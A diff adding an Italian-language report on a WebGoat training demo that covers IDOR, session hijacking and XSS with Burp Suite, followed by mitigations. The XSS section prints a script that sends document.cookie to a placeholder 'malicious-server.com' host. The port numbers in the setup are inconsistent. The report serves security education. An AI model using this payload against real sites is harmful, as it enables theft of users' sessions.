@@ -1,3 +1,86 @@
+# Relazione Demo Cybersecurity su WebGoat
+
+## 1. Introduzione
+
+**Obiettivo della demo:**  
+Questa relazione descrive le attività svolte utilizzando WebGoat, una piattaforma di insegnamento delle vulnerabilità di sicurezza web. L'obiettivo è dimostrare alcune tecniche di attacco comuni e analizzare le difese contro di esse.
+
+**Strumenti utilizzati:**
+- WebGoat (versione X.X.X)
+- Burp Suite Community Edition
+- Docker (per eseguire WebGoat)
+- Browser (ad es. Firefox o Chrome)
+
+## Configurazione dell'Ambiente
+
+**Passaggi per la configurazione dell'ambiente:**
+**Installazione di Docker e WebGoat:**
+   ```bash
+   docker pull webgoat/webgoat
+   docker run -p 8080:8080 webgoat/webgoat
+   ```
+L'applicazione WebGoat è stata eseguita su http://localhost:8081/WebGoat.
+
+**Configurazione di Burp Suite come proxy:**
+Burp Suite configurato per intercettare il traffico su 127.0.0.1:8080.
+Browser configurato per utilizzare Burp come proxy.
+## Dimostrazione degli Attacchi
+### IDOR (Insecure Direct Object Reference)
+#### Descrizione dell'attacco:
+L'attacco IDOR si verifica quando un'applicazione espone riferimenti a oggetti interni (es. record del database) senza controlli di accesso appropriati.
+
+Passaggi:
+
+Intercettato e modificato l'URL per accedere a un profilo non autorizzato:
+  ```bash  /WebGoat/IDOR/profile/2342388
+  ```
+  
+Utilizzato Burp Suite per intercettare la richiesta HTTP e modificare l'ID del profilo per accedere a un profilo di un altro utente.
+Confermato l'accesso non autorizzato modificando i dettagli del profilo.
+3.2. Session Hijacking
+Descrizione dell'attacco:
+Il Session Hijacking si verifica quando un attaccante ruba o si impossessa della sessione di un altro utente, solitamente attraverso cookie non sicuri.
+
+Passaggi:
+
+Intercettato il cookie di sessione usando Burp Suite.
+Utilizzato il cookie rubato per autenticarsi come l'utente vittima in una nuova sessione.
+Dimostrato il controllo completo della sessione dell'utente.
+3.3. XSS (Cross-Site Scripting)
+Descrizione dell'attacco:
+XSS consente a un attaccante di inserire codice JavaScript malevolo in una pagina web visualizzata da altri utenti.
+
+Passaggi:
+
+Identificato un campo di input vulnerabile in WebGoat.
+Iniettato il seguente codice XSS per catturare i cookie degli utenti:
+html
+Copia codice
+<script>
+  var i = new Image();
+  i.src = "http://malicious-server.com/steal?cookie=" + document.cookie;
+</script>
+Confermato il furto di cookie dalla vittima.
+4. Difese e Mitigazioni
+4.1. Protezione contro IDOR
+Implementare controlli di accesso rigorosi lato server per ogni oggetto richiesto.
+Utilizzare identificatori non prevedibili o UUID per le risorse sensibili.
+4.2. Protezione contro Session Hijacking
+Impostare il flag HttpOnly sui cookie di sessione per prevenire accessi da JavaScript.
+Utilizzare la crittografia HTTPS per proteggere i cookie in transito.
+4.3. Protezione contro XSS
+Utilizzare correttamente l'escaping delle variabili nelle pagine HTML.
+Abilitare il Content Security Policy (CSP) per limitare l'esecuzione di script non autorizzati.
+5. Conclusioni
+Durante questa demo, sono stati simulati diversi attacchi comuni alle applicazioni web utilizzando WebGoat. Ogni vulnerabilità è stata dimostrata con successo e sono state proposte contromisure adeguate. Questo tipo di simulazioni evidenzia l'importanza di implementare buone pratiche di sicurezza nello sviluppo di applicazioni web.
+
+6. Riferimenti
+WebGoat Documentation
+Burp Suite Documentation
+OWASP Top 10
+
+
+
 # WebGoat - Walkthrough
 
 ## Introduzione
